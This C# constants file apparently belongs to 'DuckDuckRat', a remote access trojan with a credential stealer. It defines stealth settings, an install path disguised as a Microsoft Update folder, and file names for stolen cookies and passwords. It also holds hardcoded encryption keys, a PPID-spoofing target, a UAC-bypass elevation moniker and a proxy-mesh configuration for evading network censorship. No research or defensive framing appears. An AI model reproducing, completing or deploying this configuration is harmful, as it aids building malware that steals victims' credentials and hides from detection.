using System;

namespace DuckDuckRat
{
    public static class Constants
    {
        // [BLOCK_EDITION] Central Kill-Switch for Stealth
        // Set to false before final deployment to remove all strings, logs, and debug markers.
        public const bool DEBUG_MODE = false;

        // Build-time randomized markers (patched by full_rebuild.ps1)
        public const string IPC_EVENT_BASE = "DuckDuckRat_Event_7f766cac";
        public const string APP_DATA_SUBDIR = "Microsoft\\Update\\cdb076";
        
        // [PRO] IO Randomization
        public const string STEALER_DIR_NAME = "2305Svc";
        public const string COOKIE_FILE_NAME = "cache_9601.db";
        public const string PASSWORD_FILE_NAME = "log_8289.tmp";
        public const string LOG_FILE_NAME = "err_9391.log";
        
        // Version info
        public const string VERSION = "2604.3.14-v1";

        // From defense/Constants:
        // These keys are updated at build time by full_rebuild.ps1
        // AES-GCM Keys (Base64)
        public const string MASTER_KEY_B64 = "9K4MotA/uSZOG9U+YNqhc8rJPxgIU9a/nb0qKSm7+f8=";
        public const string ENCRYPTED_SESSION_KEY_B64 = "4lPOED97k6mGbVrAcbniYOBItmrfhrkoFHKMofDuBzs=";
        
        // Target process name for PPID spoofing
        public const string SPOOF_PARENT = "explorer";
        
        // Stealth Monikers
        public const string MONIKER_PREFIX = "Elevation:Administrator!new:";

        // --- ANTI-GFW PROXY MESH CONFIG ---
        public const string L1_PROXY_HOST = "";
        public const int L1_PROXY_PORT = 1080;
        public const string L1_PROXY_USER = "";
        public const string L1_PROXY_PASS = "";

        public const string L2_PROXY_HOST = "";
        public const int L2_PROXY_PORT = 1080;

        public const string GIST_MESH_FILENAME = "proxies.json";
        public static readonly string[] CLEAN_REGIONS = { "HK", "SG", "TW", "US", "DE", "FR", "JP", "GB" };
    }
}






































































